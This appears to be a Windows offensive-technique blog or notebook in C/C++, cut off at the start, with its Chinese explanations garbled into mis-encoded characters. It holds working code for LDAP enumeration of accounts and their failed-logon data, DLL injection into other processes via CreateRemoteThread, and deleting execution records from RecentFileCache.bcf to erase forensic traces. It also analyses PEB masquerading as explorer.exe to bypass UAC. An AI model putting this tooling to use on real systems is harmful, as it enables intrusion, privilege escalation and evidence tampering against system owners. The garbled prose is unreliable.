pszPropertiesToReturn, //Properties to return for crossRef objects found //NULL returns all set properties. unsigned long ulNumPropsToReturn // Number of property strings in pszPropertiesToReturn)&#123; if (!pContainerToSearch) return E_POINTER; //Create search filter LPOLESTR pszSearchFilter = new OLECHAR[MAX_PATH * 2]; if (!pszSearchFilter) return E_OUTOFMEMORY; wchar_t szFormat[] = L&quot;(&amp;(objectClass=user)(objectCategory=person)%s)&quot;; // Check the buffer first if (IS_BUFFER_ENOUGH(MAX_PATH * 2, szFormat, szFilter) &gt; 0) &#123; //Add the filter. swprintf_s(pszSearchFilter, MAX_PATH * 2, szFormat, szFilter); &#125; else &#123; wprintf(L&quot;The filter is too large for buffer, aborting...&quot;); delete[] pszSearchFilter; return FALSE; &#125; //Specify subtree search ADS_SEARCHPREF_INFO SearchPrefs; SearchPrefs.dwSearchPref = ADS_SEARCHPREF_SEARCH_SCOPE; SearchPrefs.vValue.dwType = ADSTYPE_INTEGER; SearchPrefs.vValue.Integer = ADS_SCOPE_SUBTREE; DWORD dwNumPrefs = 1; // COL for iterations LPOLESTR pszColumn = NULL; ADS_SEARCH_COLUMN col; HRESULT hr; // Interface Pointers IADs* pObj = NULL; IADs* pIADs = NULL; // Handle used for searching ADS_SEARCH_HANDLE hSearch = NULL; // Set the search preference hr = pContainerToSearch-&gt;SetSearchPreference(&amp;SearchPrefs, dwNumPrefs); if (FAILED(hr)) &#123; delete[] pszSearchFilter; return hr; &#125; LPOLESTR pszBool = NULL; DWORD dwBool; PSID pObjectSID = NULL; LPOLESTR szSID = NULL; LPOLESTR szDSGUID = new WCHAR[39]; LPGUID pObjectGUID = NULL; FILETIME filetime; SYSTEMTIME systemtime; DATE date; VARIANT varDate; LARGE_INTEGER liValue; LPOLESTR* pszPropertyList = NULL; LPOLESTR pszNonVerboseList[] = &#123; L&quot;name&quot;,L&quot;distinguishedName&quot; &#125;; unsigned long ulNonVbPropsCount = 2; int iCount = 0; DWORD x = 0L; if (!pszPropertiesToReturn) &#123; //Return all properties. hr = pContainerToSearch-&gt;ExecuteSearch(pszSearchFilter, NULL, -1L, &amp;hSearch ); &#125; else &#123; //specified subset. pszPropertyList = pszPropertiesToReturn; //Return specified properties hr = pContainerToSearch-&gt;ExecuteSearch(pszSearchFilter, pszPropertyList, sizeof(pszPropertyList) / sizeof(LPOLESTR), &amp;hSearch ); &#125; if (SUCCEEDED(hr)) &#123; // Call IDirectorySearch::GetNextRow() to retrieve the next row //of data hr = pContainerToSearch-&gt;GetFirstRow(hSearch); if (SUCCEEDED(hr)) &#123; while (hr != S_ADS_NOMORE_ROWS) &#123; //Keep track of count. iCount++; wprintf(L&quot;----------------------------------\\n&quot;); // loop through the array of passed column names, // print the data for each column while (pContainerToSearch-&gt;GetNextColumnName(hSearch, &amp;pszColumn) != S_ADS_NOMORE_COLUMNS) &#123; hr = pContainerToSearch-&gt;GetColumn(hSearch, pszColumn, &amp;col); if (SUCCEEDED(hr)) &#123; // Print the data for the column and free the column if ((0 == wcscmp(L&quot;name&quot;, col.pszAttrName)) | (0 == wcscmp(L&quot;badPasswordTime&quot;, col.pszAttrName)) || (0 == wcscmp(L&quot;badPwdCount&quot;, col.pszAttrName)) ) &#123; // Get the data for this column wprintf(L&quot;%s:&quot;, col.pszAttrName); switch (col.dwADsType) &#123; case ADSTYPE_DN_STRING: case ADSTYPE_CASE_EXACT_STRING: case ADSTYPE_CASE_IGNORE_STRING: case ADSTYPE_PRINTABLE_STRING: case ADSTYPE_NUMERIC_STRING: case ADSTYPE_TYPEDNAME: case ADSTYPE_FAXNUMBER: case ADSTYPE_PATH: case ADSTYPE_OBJECT_CLASS: for (x = 0; x &lt; col.dwNumValues; x++) &#123; wprintf(L&quot; %s\\r\\n&quot;, col.pADsValues[x].CaseIgnoreString); &#125; break; case ADSTYPE_BOOLEAN: case ADSTYPE_INTEGER: for (x = 0; x &lt; col.dwNumValues; x++) &#123; wprintf(L&quot; %d\\r\\n&quot;, col.pADsValues[x].Integer); &#125; break; case ADSTYPE_OCTET_STRING: case ADSTYPE_UTC_TIME: case ADSTYPE_LARGE_INTEGER: for (x = 0; x &lt; col.dwNumValues; x++) &#123; liValue = col.pADsValues[x].LargeInteger; filetime.dwLowDateTime = liValue.LowPart; filetime.dwHighDateTime = liValue.HighPart; if ((filetime.dwHighDateTime == 0) &amp;&amp; (filetime.dwLowDateTime == 0)) &#123; wprintf(L&quot; No value set.\\n&quot;); &#125; else &#123; //Check for properties of type LargeInteger that represent time //if TRUE, then convert to variant time. if (0 == wcscmp(L&quot;badPasswordTime&quot;, col.pszAttrName)) &#123; //Handle special case for Never Expires where low part is -1 if (filetime.dwLowDateTime == -1) &#123; wprintf(L&quot; Never Expires.\\n&quot;); &#125; else &#123; if (FileTimeToLocalFileTime(&amp;filetime, &amp;filetime) != 0) &#123; if (FileTimeToSystemTime(&amp;filetime, &amp;systemtime) != 0) &#123; if (SystemTimeToVariantTime(&amp;systemtime, &amp;date) != 0) &#123; //Pack in variant.vt varDate.vt = VT_DATE; varDate.date = date; VariantChangeType(&amp;varDate, &amp;varDate, VARIANT_NOVALUEPROP, VT_BSTR); wprintf(L&quot; %s\\r\\n&quot;, varDate.bstrVal); VariantClear(&amp;varDate); &#125; else &#123; wprintf(L&quot; FileTimeToVariantTime failed\\n&quot;); &#125; &#125; else &#123; wprintf(L&quot; FileTimeToSystemTime failed\\n&quot;); &#125; &#125; else &#123; wprintf(L&quot; FileTimeToLocalFileTime failed\\n&quot;); &#125; &#125; &#125; else &#123; //Print the LargeInteger. wprintf(L&quot; high: %d low: %d\\r\\n&quot;, filetime.dwHighDateTime, filetime.dwLowDateTime); &#125; &#125; &#125; break; case ADSTYPE_NT_SECURITY_DESCRIPTOR: for (x = 0; x &lt; col.dwNumValues; x++) &#123; wprintf(L&quot; Security descriptor.\\n&quot;); &#125; break; default: wprintf(L&quot;Unknown type %d.\\n&quot;, col.dwADsType); &#125; &#125; pContainerToSearch-&gt;FreeColumn(&amp;col); &#125; FreeADsMem(pszColumn); &#125; //Get the next row hr = pContainerToSearch-&gt;GetNextRow(hSearch); &#125; &#125; // Close the search handle to clean up pContainerToSearch-&gt;CloseSearchHandle(hSearch); &#125; if (SUCCEEDED(hr) &amp;&amp; 0 == iCount) hr = S_FALSE; delete[] pszSearchFilter; return hr;&#125; FileMapping è¯´æ˜ï¼šåˆ›å»ºæ–‡ä»¶æ˜ å°„ä»¥å…±äº«æ•°æ® CreateFileMapping è¯´æ˜ï¼šåˆ›å»ºæ–‡ä»¶æ˜ å°„ æ­¥éª¤ åˆå§‹åŒ–å®‰å…¨æè¿°ç¬¦ SECURITY_ATTRIBUTESï¼Œè¯¥å®‰å…¨æè¿°ç¬¦æè¿°äº†å­è¿›ç¨‹æ˜¯å¦å¯ä»¥ç»§æ‰¿å½“å‰å¥æŸ„ã€‚ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š 12345typedef struct _SECURITY_ATTRIBUTES &#123; DWORD nLength; LPVOID lpSecurityDescriptor; BOOL bInheritHandle;&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES; nLength: å½“å‰ç»“æ„å¤§å° lpSecurityDescription: æŒ‡å‘ SECURITY_DESCRIPTOR çš„æŒ‡é’ˆï¼Œè¯¥ç»“æ„ä¿å­˜äº†æŸ¥è¯¢å¯¹è±¡çš„å®‰å…¨çŠ¶æ€ã€‚ bInheritHandleï¼š åˆ›å»ºæ–°è¿›ç¨‹æ—¶æ˜¯å¦ç»§æ‰¿å½“å‰å¥æŸ„ï¼Œé»˜è®¤ä¸º FALSE è°ƒç”¨ CreateFileMapping ä¸ºæŒ‡å®šæ–‡ä»¶åˆ›å»ºæˆ–æ‰“å¼€å‘½åæˆ–æœªå‘½åçš„æ–‡ä»¶æ˜ å°„å¯¹è±¡ã€‚ è°ƒç”¨MapViewOfFile ï¼Œåˆ›å»ºæ–‡ä»¶æ˜ å°„çš„è§†å›¾åˆ°è¿›ç¨‹å†…å­˜åœ°å€çš„æ˜ å°„ï¼Œè¯¥å‡½æ•°ä¼šè¿”å›æ˜ å°„åœ¨è¿›ç¨‹ç©ºé—´çš„å†…å­˜åœ°å€Address å†™å…¥æ•°æ®åˆ°æ­¥éª¤2è¿”å›çš„Addressä¸­ CreateFileMapping åˆ›å»º &quot;Global\\*&quot; å‰ç¼€çš„å¯¹è±¡æ—¶ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ã€‚ä¸éœ€è¦ç®¡ç†å‘˜æƒé™æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨ Local\\* å‰ç¼€æ¥åˆ›å»ºå¯¹è±¡ã€‚ ä¸»è¦ä»£ç  åˆ›å»ºå®‰å…¨æè¿°ç¬¦ 1234567891011121314151617181920PSECURITY_DESCRIPTOR pSec = (PSECURITY_DESCRIPTOR)LocalAlloc(LMEM_FIXED, SECURITY_DESCRIPTOR_MIN_LENGTH);if (!pSec)&#123; return GetLastError();&#125;if (!InitializeSecurityDescriptor(pSec, SECURITY_DESCRIPTOR_REVISION))&#123; LocalFree(pSec); return GetLastError();&#125;if (!SetSecurityDescriptorDacl(pSec, TRUE, NULL, TRUE))&#123; LocalFree(pSec); return GetLastError();&#125;SECURITY_ATTRIBUTES attr;attr.bInheritHandle = FALSE;attr.lpSecurityDescriptor = pSec;attr.nLength = sizeof(SECURITY_ATTRIBUTES);printf(&quot;Done\\n&quot;); åˆ›å»ºæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜çš„æ˜ å°„ï¼Œå¹¶å†™å…¥æ•°æ® 1234567891011121314HANDLE hMapFile1 = CreateFileMapping(INVALID_HANDLE_VALUE, &amp;attr, PAGE_READWRITE, 0, BUF_SIZE, szName1);if (hMapFile1 == NULL)&#123; printf(&quot;\\n[!]Could not create file mapping object1 (%d).\\n&quot;, GetLastError()); return 0;&#125;pBuf = (char*)MapViewOfFile(hMapFile1, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);if (pBuf == NULL)&#123; printf(&quot;\\n[!]Could not map view of file1 (%d).\\n&quot;, GetLastError()); CloseHandle(hMapFile1); return 1;&#125;CopyMemory((PVOID)pBuf, argv[1], strlen(argv[1])); OpenFileMapping è¯´æ˜ï¼šæ‰“å¼€æ–‡ä»¶æ˜ å°„å¹¶è¯»å–æ–‡ä»¶æ˜ å°„ä¸­çš„æ•°æ®ã€‚ æ­¥éª¤ ä¸åˆ›å»ºæ–‡ä»¶å…±äº«ä¸åŒï¼Œæ‰“å¼€å¹¶è¯»å–çš„æ­¥éª¤ç›¸å¯¹ç®€å•ã€‚ è°ƒç”¨ OpenFileMapping æ‰“å¼€ä¸€ä¸ªæŒ‡å®šåç§°çš„æ–‡ä»¶å…±äº«å¯¹è±¡ è°ƒç”¨ MapViewOfFile è·å–æ–‡ä»¶å…±äº«çš„åœ°å€ Address è¯»å– Address åœ°å€çš„å†…å®¹ ä¸»è¦ä»£ç  1234567891011121314151617TCHAR szName2[] = L&quot;Global\\\\SharedMappingObject2&quot;;HANDLE hMapFile1 = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, szName1);if (hMapFile1 == NULL)&#123; printf(&quot;[!]Could not create file mapping object (%d).\\n&quot;, GetLastError()); return 1;&#125;pBuf1 = (char*)MapViewOfFile(hMapFile1, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);if (pBuf1 == NULL)&#123; printf(&quot;[!]Could not map view of file (%d).\\n&quot;, GetLastError()); CloseHandle(hMapFile1); return 1;&#125;MessageBox(NULL, CA2W(pBuf1), TEXT(&quot;Process2&quot;), MB_OK);DWORD EventRecordID = 0; CreateRemoteThread ä¸»è¦å°±æ˜¯åœ¨ç›®æ ‡è¿›ç¨‹ä¸­è°ƒç”¨ LoadLibrary å’Œ FreeLibrary è¿™ä¸¤ä¸ªå‡½æ•°ã€‚ CreateRemoteThread LoadLibrary Freelibrary OpenProcess VirtualAllocEx GetProcAddress CreateToolhelp32Snapshot æ³¨æ„ç‚¹ å¸è½½dllæ—¶éœ€è¦åˆ¤æ–­dllæ˜¯å¦å­˜åœ¨ã€‚ éœ€è¦è°ƒç”¨ CreateToolhelp32Snapshot é€šè¿‡ MODULEENTRY32 æšä¸¾è¿›ç¨‹åŠ è½½çš„æ¨¡å—æœ‰å“ªäº›ã€‚MODULEENTRY32 ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤º szModuleï¼šæ¨¡å—å szExePathï¼šæ¨¡å—åŠ è½½çš„è·¯å¾„ 123456789101112131415typedef struct tagMODULEENTRY32&#123; DWORD dwSize; DWORD th32ModuleID; // This module DWORD th32ProcessID; // owning process DWORD GlblcntUsage; // Global usage count on the module DWORD ProccntUsage; // Module usage count in th32ProcessID&#x27;s context BYTE * modBaseAddr; // Base address of module in th32ProcessID&#x27;s context DWORD modBaseSize; // Size in bytes of module starting at modBaseAddr HMODULE hModule; // The hModule of this module in th32ProcessID&#x27;s context char szModule[MAX_MODULE_NAME32 + 1]; char szExePath[MAX_PATH];&#125; MODULEENTRY32;typedef MODULEENTRY32 * PMODULEENTRY32;typedef MODULEENTRY32 * LPMODULEENTRY32; åˆ›å»ºè¿œç¨‹çº¿ç¨‹åŠ è½½dll 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273BOOL InjectDll(UINT32 ProcessId, char* DllPath)&#123; if (strstr(DllPath, &quot;\\\\\\\\&quot;) != 0) &#123; printf(&quot;[!]Wrong Dll path\\n&quot;); return FALSE; &#125; if (strstr(DllPath, &quot;\\\\&quot;) == 0) &#123; printf(&quot;[!]Need Dll full path\\n&quot;); return FALSE; &#125; size_t len = strlen(DllPath) + 1; LPVOID pThreadData = NULL; HANDLE ProcessHandle = NULL; HANDLE hThread = NULL; BOOL bRet = FALSE; __try &#123; ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId); if (ProcessHandle == NULL) &#123; printf(&quot;[!]OpenProcess error\\n&quot;); __leave; &#125; pThreadData = VirtualAllocEx(ProcessHandle, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadData == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]VirtualAllocEx error\\n&quot;); __leave; &#125; BOOL bWriteOK = WriteProcessMemory(ProcessHandle, pThreadData, DllPath, len, NULL); if (!bWriteOK) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]WriteProcessMemory error\\n&quot;); __leave; &#125; LPTHREAD_START_ROUTINE LoadLibraryAddress = NULL; HMODULE Kernel32Module = GetModuleHandle(&quot;Kernel32&quot;); LoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, &quot;LoadLibraryA&quot;); hThread = CreateRemoteThread(ProcessHandle, NULL, 0, LoadLibraryAddress, pThreadData, 0, NULL); if (hThread == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]CreateRemoteThread error\\n&quot;); __leave; &#125; WaitForSingleObject(hThread, INFINITE); bRet = TRUE; &#125; __finally &#123; if (pThreadData != NULL) VirtualFreeEx(ProcessHandle, pThreadData, 0, MEM_RELEASE); if (hThread != NULL) CloseHandle(hThread); if (ProcessHandle != NULL) CloseHandle(ProcessHandle); &#125; return bRet;&#125; åˆ›å»ºè¿œç¨‹çº¿ç¨‹å¸è½½dll 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556BOOL FreeDll(UINT32 ProcessId, char* DllFullPath)&#123; BOOL bMore = FALSE, bFound = FALSE; HANDLE hSnapshot; HMODULE hModule = NULL; MODULEENTRY32 me = &#123; sizeof(me) &#125;; BOOL bSuccess = FALSE; hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, ProcessId); bMore = Module32First(hSnapshot, &amp;me); for (; bMore; bMore = Module32Next(hSnapshot, &amp;me)) &#123; if (!strcmp((LPCTSTR)me.szModule, DllFullPath) || !strcmp((LPCTSTR)me.szExePath, DllFullPath)) &#123; bFound = TRUE; break; &#125; &#125; if (!bFound) &#123; CloseHandle(hSnapshot); return FALSE; &#125; BOOL bRet = FALSE; HANDLE ProcessHandle = NULL; __try &#123; ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId); if (ProcessHandle == NULL) &#123; printf(&quot;[!]OpenProcess error\\n&quot;); __leave; &#125; LPTHREAD_START_ROUTINE FreeLibraryAddress = NULL; HMODULE Kernel32Module = GetModuleHandle(&quot;Kernel32&quot;); FreeLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, &quot;FreeLibrary&quot;); HANDLE hThread = NULL; hThread = CreateRemoteThread(ProcessHandle, NULL, 0, FreeLibraryAddress, me.modBaseAddr, 0, NULL); if (hThread == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]CreateRemoteThread error\\n&quot;); __leave; &#125; WaitForSingleObject(hThread, INFINITE); bRet = TRUE; &#125; __finally &#123; if (ProcessHandle != NULL) CloseHandle(ProcessHandle); &#125; return bRet;&#125; DeleteRecordFileCache RecentFileCahce.bcf æ–‡ä»¶è¯´æ˜ RecentFileCache.bcf æ–‡ä»¶æ˜¯ win7 æ“ä½œç³»ç»Ÿä¸‹ç‰¹æœ‰çš„æ–‡ä»¶ï¼Œç”¨æ¥è·Ÿè¸ªåº”ç”¨ç¨‹åºä¸ä¸åŒå¯æ‰§è¡Œæ–‡ä»¶çš„å…¼å®¹æ€§é—®é¢˜ï¼Œèƒ½å¤Ÿè®°å½•åº”ç”¨ç¨‹åºæ‰§è¡Œçš„å†å²è®°å½•ã€‚ win8åŠä»¥ä¸Šçš„ç³»ç»Ÿä¸æ”¯æŒè¯¥æ–‡ä»¶ã€‚ æ–‡ä»¶ä½ç½®ï¼š C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf å¯ä»¥ç”¨ winhex æ‰“å¼€æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š ä»å›¾ä¸­å¯ä»¥çœ‹å‡º RecenFileCache æ–‡ä»¶çš„ç»“æ„ï¼Œ20å­—èŠ‚çš„æ–‡ä»¶å¤´ï¼Œä¹‹åå°±æ˜¯ 4å­—èŠ‚é•¿åº¦åŠ æ–‡ä»¶æ‰§è¡Œè·¯å¾„è¿™æ ·çš„æ ¼å¼äº†ã€‚ æ ¹æ®æ–‡ä»¶ç»“æ„å®šä¹‰äº†ä»¥ä¸‹ä¸¤ä¸ªç»“æ„ä½“ 123456// æ–‡ä»¶typedef struct _BCF_HEADER &#123; ULONG64 Flag1; ULONG64 Flag2; ULONG Unknown;&#125; BCFHEADER, *PBCFHEADER; 123typedef struct _BCF_RECORD &#123; ULONG Size;&#125; BCFRECORD, *PBCFRECORD; æ³¨ï¼š ULONG64ä¸º8å­—èŠ‚ï¼ŒULONGä¸º4å­—èŠ‚ é€ä¸ªè§£ææ¯æ¡è®°å½•ï¼Œé€šè¿‡å›ºå®šå˜é‡Sizeç¡®å®šè®°å½•é•¿åº¦ï¼Œè¿›è€Œè¯»å–æ¯æ¡è®°å½•çš„å†…å®¹ è¯»å– RecentFileCache.bcf æ–‡ä»¶ã€‚ è¯»å– RecentFileCache æ–‡ä»¶æ—¶ï¼Œéœ€è¦æ³¨æ„æ–‡ä»¶å¤´éƒ¨åˆ†ï¼Œæ–‡ä»¶å¤´å‡ºçš„ shellcode æ˜¯å›ºå®šçš„ã€‚ ShellCode è¯´æ˜ RecentFileCache.bcf å›ºå®šçš„æ–‡ä»¶å¤´å†…å®¹ 10xFE,0xFF,0xEE,0xFF,0x11,0x22,0x00,0x00,0x03,0x00,0x00,0x00,0x01,0x00,0x00,0x00 ä»£ç  1234567891011121314151617181920212223242526272829/** * @brief è§£æ RecentFileCache æ–‡ä»¶å†…å®¹ * @detail * * @param mapAddress RecentFileCacheæ–‡ä»¶å†…å®¹ * @param StopSize åœæ­¢è¯»å–çš„ä½ç½® * @return void */void ListRecord(PVOID mapAddress, int StopSize)&#123; char flag[16] = &#123; 0xFE,0xFF,0xEE,0xFF,0x11,0x22,0x00,0x00,0x03,0x00,0x00,0x00,0x01,0x00,0x00,0x00 &#125;; if (memcmp(mapAddress, flag, 16)) &#123; printf(&quot;[!]Maybe it&#x27;s not RecentFileCache.bcf&quot;); exit(0); &#125; PBCFRECORD currentRecordPtr = NULL; PBCFRECORD nextRecordPtr = (PBCFRECORD)((PBYTE)mapAddress + 0x14); int FlagSize = 0x14; while (FlagSize &lt; StopSize) &#123; currentRecordPtr = nextRecordPtr; FlagSize += nextRecordPtr-&gt;Size * 2 + 6; WCHAR* RecordName = new WCHAR[nextRecordPtr-&gt;Size + 1]; memcpy(RecordName, nextRecordPtr + 1, nextRecordPtr-&gt;Size * 2 + 2); printf(&quot;%ws\\n&quot;, RecordName); nextRecordPtr = (PBCFRECORD)((PBYTE)nextRecordPtr + nextRecordPtr-&gt;Size * 2 + 6); &#125;&#125; åˆ é™¤è®°å½• åˆ é™¤è®°å½•åŸºæœ¬åŒè¯»å–é€»è¾‘ä¸€è‡´ã€‚ç”±äº RecentFileCache æ˜¯æŒ‰ä¸€å®šçš„ç»“æ„å†™å…¥çš„ï¼Œå› æ­¤åœ¨åˆ é™¤æ—¶ä¹Ÿéœ€è¦æŒ‰ç›¸åº”çš„ç»“æ„æ“ä½œã€‚ å³ï¼šåˆ é™¤ä¸€æ¡è®°å½•=åˆ é™¤è®°å½•é•¿åº¦å’Œè®°å½•çš„å†…å®¹ ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/** * @brief DeleteRecord * @detail åˆ é™¤ RecentFileCache ä¸­çš„æŸæ¡è®°å½• * * @param mapAddress RecentFileCache æ–‡ä»¶å†…å®¹ * @param TempBuf ä¸´æ—¶å­˜æ”¾æ•°ç»„ï¼Œç”¨æ¥ä¿å­˜åˆ é™¤èŠ‚ç‚¹åçš„å†…å®¹ * @param StopSize åœæ­¢æŸ¥æ‰¾çš„ä½ç½® * @param FileName åˆ é™¤çš„èŠ‚ç‚¹å†…å®¹ * @return è¿”å›åˆ é™¤è®°å½•åçš„æ–‡ä»¶å†…å®¹ * @retval char* */char* DeleteRecord(PVOID mapAddress, char* TempBuf, int StopSize, WCHAR* FileName)&#123; char flag[16] = &#123; 0xFE,0xFF,0xEE,0xFF,0x11,0x22,0x00,0x00,0x03,0x00,0x00,0x00,0x01,0x00,0x00,0x00 &#125;; if (memcmp(mapAddress, flag, 16)) &#123; printf(&quot;[!]Maybe it&#x27;s not RecentFileCache.bcf&quot;); exit(0); &#125; memcpy(TempBuf, mapAddress, 0x14); PBCFRECORD currentRecordPtr = NULL; PBCFRECORD nextRecordPtr = (PBCFRECORD)((PBYTE)mapAddress + 0x14); int DeleteSize = 0; int FlagSize = 0x14; while (FlagSize + DeleteSize &lt; StopSize) &#123; currentRecordPtr = nextRecordPtr; WCHAR* RecordName = new WCHAR[nextRecordPtr-&gt;Size + 1]; memcpy(RecordName, nextRecordPtr + 1, nextRecordPtr-&gt;Size * 2 + 2); printf(&quot;%ws\\n&quot;, RecordName); if (wcscmp(RecordName, FileName) == 0) &#123; printf(&quot;[+]Data found:%ws\\n&quot;, RecordName); DeleteSize += nextRecordPtr-&gt;Size * 2 + 6; &#125; else &#123; memcpy(TempBuf + FlagSize, currentRecordPtr, nextRecordPtr-&gt;Size * 2 + 6); FlagSize += nextRecordPtr-&gt;Size * 2 + 6; &#125; nextRecordPtr = (PBCFRECORD)((PBYTE)nextRecordPtr + nextRecordPtr-&gt;Size * 2 + 6); &#125; NewSize = FlagSize; return TempBuf;&#125; MasqueradePEBToCopyfile è¿›ç¨‹ä¼ªè£…æˆ explorer.exe è¿›è€Œè¾¾åˆ°è¿›ç¨‹ææƒçš„ç›®çš„ å‚è€ƒä»£ç ï¼šhfiref0x/UACME at 143ead4db6b57a84478c9883023fbe5d64ac277b UACè§¦å‘æµç¨‹ åœ¨è§¦å‘ UAC æ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸€ä¸ªconsent.exeè¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹ç”¨ä»¥ç¡®å®šæ˜¯å¦åˆ›å»ºç®¡ç†å‘˜è¿›ç¨‹ï¼ˆé€šè¿‡ç™½åå•å’Œç”¨æˆ·é€‰æ‹©åˆ¤æ–­ï¼‰ï¼Œç„¶åcreatprocessè¯·æ±‚è¿›ç¨‹,å°†è¦è¯·æ±‚çš„è¿›ç¨‹cmdlineå’Œè¿›ç¨‹è·¯å¾„é€šè¿‡LPCæ¥å£ä¼ é€’ç»™appinfoçš„RAiLuanchAdminProcesså‡½æ•°ï¼Œè¯¥å‡½æ•°é¦–å…ˆéªŒè¯è·¯å¾„æ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œå¹¶å°†ç»“æœä¼ é€’ç»™consent.exeè¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹éªŒè¯è¢«è¯·æ±‚çš„è¿›ç¨‹ç­¾åä»¥åŠå‘èµ·è€…çš„æƒé™æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œç„¶åå†³å®šæ˜¯å¦å¼¹å‡ºUACæ¡†è®©ç”¨æˆ·è¿›è¡Œç¡®è®¤ã€‚è¿™ä¸ªUACæ¡†ä¼šåˆ›å»ºæ–°çš„å®‰å…¨æ¡Œé¢ï¼Œå±è”½ä¹‹å‰çš„ç•Œé¢ã€‚åŒæ—¶è¿™ä¸ªUACæ¡†è¿›ç¨‹æ˜¯SYSTEMæƒé™è¿›ç¨‹ï¼Œå…¶ä»–æ™®é€šè¿›ç¨‹ä¹Ÿæ— æ³•å’Œå…¶è¿›è¡Œé€šä¿¡äº¤äº’ã€‚ç”¨æˆ·ç¡®è®¤ä¹‹åï¼Œä¼šè°ƒç”¨CreateProcessAsUserå‡½æ•°ä»¥ç®¡ç†å‘˜æƒé™å¯åŠ¨è¯·æ±‚çš„è¿›ç¨‹ è°ƒç”¨è¯´æ˜ ä¿®æ”¹å‚æ•°ï¼š æ¥ä¸‹æ¥éœ€è¦æ·»åŠ ä¿®æ”¹PEBç»“æ„çš„åŠŸèƒ½ï¼Œä¸ºäº†æ¬ºéª—PSAPIï¼Œå…±éœ€è¦ä¿®æ”¹ä»¥ä¸‹ä½ç½®ï¼š _RTL_USER_PROCESS_PARAMETERS.ImagePathName _RTL_USER_PROCESS_PARAMETERS.CommandLine(å¯é€‰) _LDR_DATA_TABLE_ENTRY.FullDllName _LDR_DATA_TABLE_ENTRY.BaseDllName å±æ€§è¯´æ˜ï¼š FOF_NOCONFIRMATION :ä¸å¼¹å‡ºç¡®è®¤æ¡† FOF_SILENT:ä¸å¼¹æ¡† FOFX_SHOWELEVATIONPROMPT:éœ€è¦æå‡æƒé™ FOFX_NOCOPYHOOKS:ä¸ä½¿ç”¨copy hooks FOFX_REQUIREELEVATION:é»˜è®¤éœ€è¦æå‡æƒé™ FOF_NOERRORUI:æŠ¥é”™ä¸å¼¹æ¡† åŒºåˆ« æ™®é€šè¿›ç¨‹éœ€è¦æ‰§è¡Œä¸¤æ­¥ï¼Œä¼ªè£…è¿›ç¨‹åªéœ€è¦ç¬¬äºŒæ­¥çš„ææƒ è·å–è¿›ç¨‹æƒé™ .hdfaojzkvhdg{zoom:50%;} è·å–æ“ä½œæƒé™ .afpwtsbtotws{zoom:50%;} è°ƒç”¨åˆ†æ å †æ ˆ ä¼ªè£…è¿›ç¨‹è°ƒç”¨æ ˆï¼Œæ‰§è¡Œæ“ä½œçš„ææƒæœ€ç»ˆè°ƒç”¨çš„ combase!CComActivator::StandardCreateInstanceï¼Œå‡½æ•°åŸå‹è§åæ–‡ã€‚ä½†æ˜¯æ™®é€šè¿›ç¨‹åœ¨æ‰§è¡Œæ“ä½œå‰éœ€è¦è°ƒç”¨ _CreateElevatedCopyengine å¯¹å½“å‰è¿›ç¨‹å…ˆææƒã€‚ 123456[0x0] windows_storage!CFileOperation::_PerformProperElevatedOperations + 0x97 [0x1] windows_storage!CFileOperation::_RunElevatedOperation + 0x7b [0x2] windows_storage!CFileOperation::_ProcessLUAOperations + 0x118056 [0x3] windows_storage!CFileOperation::PrepareAndDoOperations + 0x238 [0x4] windows_storage!CFileOperation::PerformOperations + 0xd4 [0x5] MasqueradePEBtoCopyfile!wmain + 0x365 è°ƒç”¨å †æ ˆï¼Œç”±ä¸Šè€Œä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455003a3f43 7c1a jl MasqueradePEBtoCopyfile!wmain+0x36f (003a3f5f)751b226f e8de620000 call windows_storage!CFileOperation::PrepareAndDoOperations (751b8552)751b8785 e8810f0000 call windows_storage!CFileOperation::_ProcessLUAOperations (751b970b)752d175c e88c111a00 call windows_storage!CFileOperation::_RunElevatedOperation (754728ed) # è¿™é‡Œæ—¶è·å–è¿›ç¨‹çš„ç®¡ç†å‘˜æƒé™ # è·å–å½“å‰è¿›ç¨‹ Elevated 7547291d e826c8ffff call windows_storage!CFileOperation::_GetElevatedOperation (7546f148) # å¦‚æœæ²¡æœ‰ è°ƒç”¨ CoCreateInstanceAsAdmin 75472935 e8e7b9ffff call windows_storage!CFileOperation::_CreateElevatedCopyengine (7546e321) 7546e35f e8722affff call windows_storage!CoCreateInstanceAsAdmin (75460dd6) 75460e82 ff1544bc5e75 call dword ptr [windows_storage!_imp__CoGetObject (755ebc44)]75472963 e8f5ebffff call windows_storage!CFileOperation::_PerformProperElevatedOperations (7547155d) # è¿™é‡Œè·å–å½“å‰æ“ä½œçš„ç®¡ç†å‘˜æƒé™ 754715d7 ff15ec5a5e75 call dword ptr [windows_storage!__guard_check_icall_fptr (755e5aec)][0x0] 